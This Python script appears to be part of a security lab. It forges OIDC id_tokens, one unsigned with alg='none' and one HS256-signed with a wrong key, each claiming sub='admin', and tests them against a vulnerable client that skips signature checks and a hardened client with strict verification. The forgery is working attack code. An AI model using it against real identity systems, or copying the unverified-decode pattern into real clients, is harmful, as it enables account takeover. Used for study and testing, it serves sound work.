"""
attack5_idtoken.py
==================
Root cause: the client accepts an OIDC id_token without verifying it -- no
signature check, no algorithm pinning, no iss/aud/nonce validation (OpenID
Connect Core 1.0 sec 3.1.3.7). It simply base64url-decodes the payload and
trusts whatever `sub` it finds.

This matters whenever an attacker can place an id_token in front of the
client: a malicious or mixed-up authorization server, a MITM on a non-pinned
channel, or a front-channel (hybrid/implicit) response.

Two forgeries are tested against BOTH validation strategies:
  F1: alg="none" unsigned token claiming sub="admin"
  F2: HS256 token signed with the WRONG key claiming sub="admin"

  - Vulnerable strategy = oauth_engine.jwt_decode_unverified  (what the
    vulnerable client uses)
  - Hardened strategy   = oauth_engine.jwt_verify             (what the
    hardened client uses, with all expectations pinned)

SUCCESS (vulnerable) = forged sub="admin" is accepted.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import oauth_engine as eng

ISS = "http://localhost:5000"
AUD = "webapp"
REAL_KEY = "webapp-secret-0xDEADBEEF"


def _forgeries():
    none_tok = eng.jwt_encode({"iss": ISS, "aud": AUD, "sub": "admin"}, "", alg="none")
    wrongkey_tok = eng.jwt_encode({"iss": ISS, "aud": AUD, "sub": "admin"},
                                  "attacker-guessed-key", alg="HS256")
    return {"alg=none": none_tok, "HS256/wrong-key": wrongkey_tok}


def vulnerable_accepts(token):
    """Mirror the vulnerable client: trust the payload, no verification."""
    _, claims = eng.jwt_decode_unverified(token)
    return claims.get("sub")


def hardened_accepts(token):
    """Mirror the hardened client: strict verify, pinned expectations."""
    try:
        claims = eng.jwt_verify(token, REAL_KEY, expected_alg="HS256",
                                expected_iss=ISS, expected_aud=AUD)
        return claims.get("sub")
    except ValueError:
        return None


def attack():
    # Which client is live? The vulnerable client trusts the token unverified;
    # the hardened client runs strict jwt_verify. Default to 'vulnerable' so the
    # script still demonstrates the flaw when run on its own; the orchestrator
    # sets IDTOKEN_STRATEGY=hardened for the hardened run.
    strategy = os.environ.get("IDTOKEN_STRATEGY", "vulnerable")
    accepts = hardened_accepts if strategy == "hardened" else vulnerable_accepts

    accepted = []
    for name, tok in _forgeries().items():
        if accepts(tok) == "admin":
            accepted.append(name)
    if accepted:
        return True, f"{strategy} client accepted forged id_token(s): {accepted} -> sub=admin"
    return False, f"{strategy} client rejected all forgeries (good)"


if __name__ == "__main__":
    ok, detail = attack()
    print(("[VULNERABLE] " if ok else "[BLOCKED] ") + detail)
    # also show that the hardened strategy rejects both, for contrast
    for name, tok in _forgeries().items():
        print(f"   hardened vs {name}: sub={hardened_accepts(tok)} (None = rejected)")
